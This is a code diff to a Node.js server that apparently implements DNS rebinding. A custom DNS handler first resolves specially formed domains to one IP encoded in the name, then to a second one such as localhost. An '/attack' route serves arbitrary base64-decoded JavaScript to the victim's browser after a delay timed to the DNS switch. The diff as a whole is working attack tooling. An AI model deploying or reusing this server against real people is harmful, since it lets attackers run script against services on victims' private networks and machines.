@@ -3,6 +3,7 @@ const httpPort = 5000
 
 const express = require('express')
 const app = express()
+app.use(express.static('public'))
 
 const dns = require('node-named')
 const dnsPort = 53
@@ -16,8 +17,13 @@ dnsServer.listen(dnsPort, '::ffff:0.0.0.0', ()=> {
 let cache = {}
 
 dnsServer.on('query', query => {
-  var domain = query.name()
-  var type = query.type()
+  const domain = query.name()
+  const type = query.type()
+
+  const splits = domain.split('.')
+
+  if(splits.length != 6)
+    return
 
   if(!cache[domain]){
     cache[domain] = {
@@ -28,10 +34,10 @@ dnsServer.on('query', query => {
   switch(type){
     case 'A':
       if(cache[domain].timeStamp > Date.now() - 2000){
-        let record = new dns.ARecord('81.4.124.10')
+        let record = new dns.ARecord(splits[1].replace(/-/g, '.'))
         query.addAnswer(domain, record, 0)
       }else{
-        let record = new dns.ARecord('127.0.0.1')
+        let record = new dns.ARecord(splits[2].replace(/-/g, '.'))
         query.addAnswer(domain, record, 0)
       }
       break;
@@ -44,16 +50,14 @@ dnsServer.on('query', query => {
   dnsServer.send(query)
 })
 
-app.get('/', (req, res) => {
-  res.sendFile('public/index.html' , { root : __dirname})
-})
-
 app.get('/attack', (req, res) => {
   const script = new Buffer(req.query.script, 'base64').toString('ascii')
   res.end(`
     <html>
       <script>
-        ${script} 
+        setTimeout(function(){
+          ${script} 
+        }, 3000)
       </script>
     </html>
   `)
